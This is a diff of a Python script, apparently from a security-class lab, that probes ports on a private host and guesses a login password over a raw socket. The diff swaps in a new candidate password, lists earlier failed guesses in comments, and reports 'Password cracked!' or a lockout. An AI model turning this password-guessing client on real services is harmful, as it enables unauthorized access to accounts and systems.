@@ -1,11 +1,12 @@
 import re
 import socket
+import time
 
 HOST = '192.168.1.10'
 SKELETONKEY = 'Passepartout'
 BYTES = 1024
 CRUZID = 'bosdhill\n'
-PASSWORD = "Merlot"
+PASSWORD = "Palace"
 # tried
 # Gunners
 # gunners
@@ -18,14 +19,29 @@ PASSWORD = "Merlot"
 # zinfandel
 # merlot
 # Merlot
+# MERLOT
 
 def get_next_password_from_dictionary():
      return PASSWORD
 
 def crack_password(port, s):
+     PORT = 10247
+     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+     s.connect((HOST, PORT))
+     s.sendall(SKELETONKEY)
+     time.sleep(2)
+     data = s.recv(BYTES)
+     s.sendall(CRUZID)
+     data = s.recv(BYTES)
      s.sendall(get_next_password_from_dictionary())
      data = s.recv(BYTES)
-     print('Received %s from port %d' % (repr(data), port))
+     if data == '':
+          print("Sleep for 602 seconds.")
+     elif data == 'Incorrect password, goodbye.':
+          print('Didnt work.')
+     else:
+          print("Password cracked! It is %s" % PASSWORD)
+     print("data received: %s\n" % data)
 
 def try_ports():
      fp = open("out", "r")
@@ -35,6 +51,7 @@ def try_ports():
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.connect((HOST, PORT))
           s.sendall(SKELETONKEY)
+          time.sleep(2)
           data = s.recv(BYTES)
           s.sendall(CRUZID)
           data = s.recv(BYTES)
@@ -42,9 +59,10 @@ def try_ports():
                print('Received %s from port %d' % (repr(data), PORT))
                crack_password(PORT, s)
 
-
 if __name__ == "__main__":
-     try_ports()
+     s = []
+     port = []
+     crack_password(port, s)
 
 
 
